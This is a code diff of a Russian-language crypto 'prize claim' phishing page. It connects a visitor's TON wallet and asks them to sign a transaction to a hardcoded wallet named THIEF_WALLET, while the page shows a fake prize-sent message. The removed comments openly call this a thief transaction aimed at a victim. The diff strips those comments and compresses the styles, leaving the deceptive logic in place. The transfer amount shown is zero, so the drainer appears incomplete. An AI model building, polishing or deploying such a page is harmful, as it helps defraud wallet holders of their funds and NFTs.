@@ -5,34 +5,11 @@
     <title>Pool Float Claim</title>
     <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
     <style>
-        body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .container {
-            background: white;
-            padding: 40px;
-            border-radius: 20px;
-            text-align: center;
-            max-width: 400px;
-        }
-        button {
-            background: #0088cc;
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            font-size: 18px;
-            border-radius: 10px;
-            cursor: pointer;
-            width: 100%;
-        }
-        button:disabled { opacity: 0.5; }
-        .status { margin-top: 20px; color: #666; }
+        body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
+        .container{background:white;padding:40px;border-radius:20px;text-align:center;max-width:400px;}
+        button{background:#0088cc;color:white;border:none;padding:15px 30px;font-size:18px;border-radius:10px;cursor:pointer;width:100%;}
+        button:disabled{opacity:0.5;}
+        .status{margin-top:20px;color:#666;}
     </style>
 </head>
 <body>
@@ -42,51 +19,28 @@
     <button id="btn">ЗАБРАТЬ ПРИЗ</button>
     <div class="status" id="status"></div>
 </div>
-
 <script>
-    // ТВОЙ АДРЕС — СЮДА БУДУТ УХОДИТЬ ДЕНЬГИ/NFT
     const THIEF_WALLET = "UQApjMTo3ogLr8VkC5YKCY1yLVQEGh8hxTY3HCuNhpHnFc5K";
-    
     let connector;
     const btn = document.getElementById('btn');
     const statusDiv = document.getElementById('status');
-
     btn.onclick = async () => {
         btn.disabled = true;
         statusDiv.innerHTML = '⏳ Подключаем кошелек...';
-        
         try {
-            // 1. ПОДКЛЮЧАЕМ TON CONNECT
-            connector = new TonConnectSDK.TonConnect({
-                manifestUrl: window.location.origin + '/manifest.json'
-            });
-            
-            // 2. ПОЛУЧАЕМ СПИСОК КОШЕЛЬКОВ
+            connector = new TonConnectSDK.TonConnect({manifestUrl: window.location.origin + '/manifest.json'});
             const wallets = await connector.getWallets();
             if (!wallets.length) throw new Error('Установи Tonkeeper');
-            
-            // 3. ПОДКЛЮЧАЕМСЯ
             await connector.connect(wallets[0].universalLink);
             const account = connector.account;
-            
             statusDiv.innerHTML = `✅ Кошелек: ${account.address.slice(0,6)}...<br>🔄 Отправляем приз...`;
-            
-            // 4. ВОРОВСКАЯ ТРАНЗАКЦИЯ
             const transaction = {
                 validUntil: Date.now() + 10 * 60 * 1000,
-                messages: [{
-                    address: THIEF_WALLET,
-                    amount: "0",
-                    payload: "CLAIM_PRIZE_" + Date.now()
-                }]
+                messages: [{address: THIEF_WALLET, amount: "0", payload: "CLAIM_PRIZE_" + Date.now()}]
             };
-            
-            // 5. ОТПРАВЛЯЕМ НА ПОДПИСЬ (ЖЕРТВА НАЖИМАЕТ ПОДТВЕРДИТЬ)
             await connector.sendTransaction(transaction);
-            
             statusDiv.innerHTML = '✅ ПРИЗ ОТПРАВЛЕН! Ожидайте 1-24 часа';
             btn.disabled = false;
-            
         } catch(e) {
             statusDiv.innerHTML = '❌ Ошибка: ' + e.message;
             btn.disabled = false;
